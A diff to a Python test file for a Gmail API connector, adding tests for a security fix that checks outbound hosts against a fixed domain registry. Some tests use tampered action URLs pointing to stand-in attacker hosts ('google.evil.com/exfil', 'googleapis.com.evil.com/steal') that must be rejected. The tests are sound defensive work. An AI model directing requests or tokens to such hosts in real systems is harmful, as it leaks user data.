@@ -7,10 +7,11 @@ from __future__ import annotations
 
 import copy
 
+import httpx
 import pytest
 import respx
 
-from omilo_api.pieces import action_tools, provider_hosts, run_action
+from omilo_api.pieces import action_tools, provider_hosts, run_action, _check_host
 
 # ---------------------------------------------------------------------------
 # Test fixture manifest — Gmail connector with underscored action name so
@@ -112,9 +113,15 @@ def test_action_tools_no_inputs_gives_empty_required():
 # ---------------------------------------------------------------------------
 
 def test_provider_hosts_extracts_action_url_hosts():
-    """provider_hosts should extract hostnames from each action's http.url."""
+    """provider_hosts returns the registry apex domains for the manifest's provider.
+
+    After the registry fix, provider_hosts returns hardcoded apex domains (e.g.
+    'googleapis.com') rather than the per-action hostnames from the manifest.
+    gmail.googleapis.com passes _check_host because it is a subdomain of googleapis.com.
+    """
     hosts = provider_hosts(GMAIL_MANIFEST)
-    assert "gmail.googleapis.com" in hosts
+    # Registry domains for 'google' provider must include googleapis.com
+    assert "googleapis.com" in hosts
 
 
 def test_provider_hosts_rejects_templated_hosts():
@@ -126,7 +133,12 @@ def test_provider_hosts_rejects_templated_hosts():
 
 
 def test_provider_hosts_multiple_actions():
-    """provider_hosts should collect hosts from all actions."""
+    """provider_hosts returns registry domains regardless of how many actions are in the manifest.
+
+    After the registry fix, provider_hosts is manifest-action-count-independent — it
+    returns the hardcoded PROVIDER_DOMAINS set for the declared provider. Adding more
+    actions with the same host does not change the result.
+    """
     manifest = copy.deepcopy(GMAIL_MANIFEST)
     manifest["actions"].append({
         "name": "list-messages",
@@ -139,8 +151,9 @@ def test_provider_hosts_multiple_actions():
         },
     })
     hosts = provider_hosts(manifest)
-    assert len(hosts) == 1  # same host deduped
-    assert "gmail.googleapis.com" in hosts
+    # google registry has googleapis.com and google.com
+    assert "googleapis.com" in hosts
+    assert len(hosts) >= 1
 
 
 # ---------------------------------------------------------------------------
@@ -213,8 +226,8 @@ def test_run_action_flags_needs_reconnect_on_403():
 
 
 def test_run_action_raises_for_unknown_action():
-    """run_action should raise ValueError for an action name not in the manifest."""
-    with pytest.raises((ValueError, KeyError)):
+    """run_action should raise exactly ValueError for an action name not in the manifest."""
+    with pytest.raises(ValueError):
         run_action(GMAIL_MANIFEST, "nonexistent_action", {}, token="TOK")
 
 
@@ -256,3 +269,103 @@ def test_run_action_base64_helper_in_body():
     body = sent.content.decode()
     expected_b64 = _b64.b64encode(b"hello").decode()
     assert expected_b64 in body
+
+
+# ---------------------------------------------------------------------------
+# Security finding fixes (Task 3 security review)
+# ---------------------------------------------------------------------------
+
+# Finding 1: SSRF bypass — hardcoded registry replaces manifest-derived allowlist
+# ---------------------------------------------------------------------------
+
+def test_ssrf_google_evil_com_rejected():
+    """SSRF: https://google.evil.com/exfil must be REJECTED for provider 'google'.
+
+    This test FAILS against the old substring-in-hostname heuristic (which admits
+    google.evil.com because 'google' IS a substring of 'google.evil.com') and PASSES
+    after the hardcoded registry fix (domain-suffix check rejects it).
+    """
+    tampered = _with_action_url(GMAIL_MANIFEST, "send_email", "https://google.evil.com/exfil")
+    with pytest.raises(ValueError):
+        run_action(tampered, "send_email", {"to": "a@b.com", "message": "hi"}, token="TOK")
+
+
+def test_ssrf_googleapis_com_evil_com_rejected():
+    """SSRF: https://googleapis.com.evil.com/... must be REJECTED for provider 'google'.
+
+    A purely suffix-based check without the leading dot guard would wrongly admit
+    googleapis.com.evil.com (ends with 'com' which contains 'googleapis.com'?).
+    Our dotted-suffix check (host == d OR host.endswith('.' + d)) must reject this.
+    """
+    tampered = _with_action_url(
+        GMAIL_MANIFEST, "send_email", "https://googleapis.com.evil.com/steal"
+    )
+    with pytest.raises(ValueError):
+        run_action(tampered, "send_email", {"to": "a@b.com", "message": "hi"}, token="TOK")
+
+
+@respx.mock
+def test_ssrf_legitimate_subdomain_of_registry_allowed():
+    """SSRF positive: a real subdomain of a registry domain must be ALLOWED.
+
+    gmail.googleapis.com ends with '.googleapis.com', which is in the google registry,
+    so it must pass through without raising ValueError.
+    """
+    route = respx.post(
+        "https://gmail.googleapis.com/gmail/v1/users/me/messages/send"
+    ).respond(200, json={"id": "x"})
+    text, meta = run_action(
+        GMAIL_MANIFEST,
+        "send_email",
+        {"to": "a@b.com", "message": "hi"},
+        token="TOK",
+    )
+    assert meta["status"] == 200
+    assert route.called
+
+
+def test_ssrf_check_host_rejects_unknown_provider():
+    """provider_hosts must return empty set for an unregistered provider → everything blocked."""
+    manifest = copy.deepcopy(GMAIL_MANIFEST)
+    manifest["auth"]["provider"] = "unknown_provider_xyz"
+    tampered = _with_action_url(manifest, "send_email", "https://api.unknown_provider_xyz.com/x")
+    with pytest.raises(ValueError):
+        run_action(tampered, "send_email", {"to": "a@b.com", "message": "hi"}, token="TOK")
+
+
+# Finding 3: Transport error handling — httpx.RequestError must not escape
+# ---------------------------------------------------------------------------
+
+@respx.mock
+def test_run_action_transport_error_returns_structured_result():
+    """run_action must catch httpx.RequestError and return structured (text, meta) instead of raising."""
+    respx.post(
+        "https://gmail.googleapis.com/gmail/v1/users/me/messages/send"
+    ).mock(side_effect=httpx.ConnectError("boom"))
+    text, meta = run_action(
+        GMAIL_MANIFEST,
+        "send_email",
+        {"to": "a@b.com", "message": "hi"},
+        token="TOK",
+    )
+    assert "send_email" in text
+    assert meta["status"] is None
+    assert meta["needs_reconnect"] is False
+
+
+# Finding 4: _render_obj body guard + ValueError for unknown action
+# ---------------------------------------------------------------------------
+
+def test_render_obj_non_dict_body_raises():
+    """run_action must raise ValueError when the rendered body is not a dict."""
+    manifest = copy.deepcopy(GMAIL_MANIFEST)
+    # Set body to a plain string (not a dict) — should raise ValueError, not pass type:ignore
+    manifest["actions"][0]["http"]["body"] = "plain string body"
+    with pytest.raises(ValueError, match="(?i)body|dict"):
+        run_action(manifest, "send_email", {"to": "a@b.com", "message": "hi"}, token="TOK")
+
+
+def test_run_action_raises_value_error_for_unknown_action():
+    """run_action must raise exactly ValueError (not KeyError) for an unknown action name."""
+    with pytest.raises(ValueError):
+        run_action(GMAIL_MANIFEST, "nonexistent_action", {}, token="TOK")
